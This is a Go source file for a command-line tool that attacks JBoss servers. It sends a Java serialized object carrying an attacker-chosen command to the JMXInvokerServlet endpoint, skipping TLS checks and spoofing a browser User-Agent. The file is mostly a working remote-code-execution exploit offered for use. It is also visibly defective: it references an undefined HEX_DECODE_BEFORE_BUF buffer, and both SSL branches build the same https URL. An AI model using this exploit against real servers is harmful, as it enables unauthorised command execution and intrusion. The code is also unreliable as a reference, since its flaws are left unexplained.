/*

Developer => ArkAngeL43
Github    => https://www.github.com/ArkAngeL43
In contri => In contribvution to the RR5 project
Type      => CLI
APP       => CLI
Package   => main

vars:
	host_port = flag.String("hp", "", "set a host and port to attack example 127.0.0.1:8080")
	command   = flag.String("command", "", "set a command to be executed")
	want_ssl  = flag.Bool("SSL", false, "")
	// make visible to all classes
	
	HEX_DECODE_AFTER_BUF  = "740004657865637571007E001E0000000171007E00237371007E0011737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F40000000000010770800000010000000007878767200126A6176612E6C616E672E4F766572726964650000000000000000000000787071007E003A"
	url                   string
	clin                  *http.Client
	returnc               = "\033[0;39m"
	BLK                   = "\033[0;30m"
	RED                   = "\033[0;31m"
	GRN                   = "\033[0;32m"
	YEL                   = "\033[0;33m"
	BLU                   = "\033[0;34m"
	MAG                   = "\033[0;35m"
	CYN                   = "\033[0;36m"
	WHT                   = "\033[0;37m"
	BHWHT                 = "\033[1;97m"
	ch                    = "\x1b[H\x1b[2J\x1b[3J"
	base_jboss_URL_path   = "invoker/JMXInvokerServlet"
	jmethod               = "POST"


arguments:
	-hp       | set host and port
	-command  | Set a command to execute on service
	-SSL      | Set SSL usage

functions:
	ce(err error, exit_code int, msg string) bool
	error handeling function

	main | takes no arguments returns nothing
	main function

	data_parser_and_banner(banner_file_string)
	returns banner and attack table

	jbos_en(host ssl command int err erorr)
	takes host as a target
	ssl as a boolean val
	command as an execution command on service

	main attack method attacks JBOSS services



*/
package main

import (
	"bytes"
	"crypto/tls"
	"encoding/hex"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"

	"github.com/bndr/gotabulate"
)

var (
	host_port = flag.String("hp", "", "set a host and port to attack example 127.0.0.1:8080")
	command   = flag.String("command", "", "set a command to be executed")
	want_ssl  = flag.Bool("SSL", false, "")
	// make visible to all classes
	
	HEX_DECODE_AFTER_BUF  = "740004657865637571007E001E0000000171007E00237371007E0011737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F40000000000010770800000010000000007878767200126A6176612E6C616E672E4F766572726964650000000000000000000000787071007E003A"
	url                   string
	clin                  *http.Client
	returnc               = "\033[0;39m"
	BLK                   = "\033[0;30m"
	RED                   = "\033[0;31m"
	GRN                   = "\033[0;32m"
	YEL                   = "\033[0;33m"
	BLU                   = "\033[0;34m"
	MAG                   = "\033[0;35m"
	CYN                   = "\033[0;36m"
	WHT                   = "\033[0;37m"
	BHWHT                 = "\033[1;97m"
	ch                    = "\x1b[H\x1b[2J\x1b[3J"
	base_jboss_URL_path   = "invoker/JMXInvokerServlet"
	jmethod               = "POST"
)

func ce(err error, exit_code int, msg string) bool {
	if err != nil {
		if msg == "" {
			fmt.Println(err)
			os.Exit(exit_code)
			return true
		} else {
			log.Fatal(err, msg)
			os.Exit(exit_code)
			return true
		}
	} else {
		return false
	}
}

func data_parser_and_banner(banner_file string) {
	flag.Parse()
	content_bnnr, err := ioutil.ReadFile(banner_file)
	ce(err, 1, "")
	fmt.Println(ch)
	fmt.Println(BLU, string(content_bnnr))
	row_2 := []interface{}{*host_port, *want_ssl, *command}
	tt := gotabulate.Create([][]interface{}{row_2})
	tt.SetHeaders([]string{"Host and Port", "SSL true/false", "command_exec"})
	tt.SetEmptyString("None")
	tt.SetAlign("center")
	fmt.Println(RED)
	fmt.Println(tt.Render("grid"))
}

func is_online_main(url string) {
	connect, err := http.Get(url)
	if err != nil {
		log.Fatal(err)
	} else {
		if connect.StatusCode >= 200 {
			fmt.Println(GRN, "WARN: DATA: [ User online ] ")
		} else {
			fmt.Println(RED, "WARN: ERROR: DATA: [ User may be offline ] ")
		}
	}

}

func jbos_en(ssl bool, command, host string) (int, error) {
	obj_serial, err := hex.DecodeString(HEX_DECODE_BEFORE_BUF)
	ce(err, 1, "ERROR DECODING STRING")
	obj_serial = append(obj_serial, byte(len(command)))
	obj_serial = append(obj_serial, []byte(command)...)
	bf_af, err := hex.DecodeString(HEX_DECODE_AFTER_BUF)
	ce(err, 1, "ERROR: FATAL: ERROR HEX DECODING AFTER BUF")
	obj_serial = append(obj_serial, bf_af...)
	if ssl {
		clin = &http.Client{
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,
				},
			},
		}
		url = fmt.Sprintf("https://%s/%s", host, base_jboss_URL_path)
	} else {
		clin = &http.Client{}
		url = fmt.Sprintf("https://%s/%s", host, base_jboss_URL_path)
	}
	main_request, http_err := http.NewRequest(jmethod, url, bytes.NewReader(obj_serial))
	ce(http_err, 1, "COULD NOT CREATE NEW POST REQUEST USING HTTP CLIENT")
	main_request.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko")
	main_request.Header.Set("Content-Type", "application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue")
	fmt.Println(BLU, "REQUEST INFO -> REQUEST HEADERS SET")
	response, err := clin.Do(main_request)
	fmt.Println(WHT, "REQUEST DATA -> REQUEST MADE TO -> ", host)
	if err != nil {
		return 0, err
	}
	fmt.Println(BLU, "SERVICE -> ", response, " MADE")
	return response.StatusCode, nil

}

func main() {
	flag.Parse()
	data_parser_and_banner("jbos.txt")
	is_online_main("https://www.google.com")
	if *host_port == "" {
		log.Fatal("ERROR: HOST AND PORT FEILD IS NOT FILLED OUT, PLEASE TRY SOMETHING LIKE -> 127.0.0.1:8080")
	}
	jbos_en(*want_ssl, *command, *host_port)
}
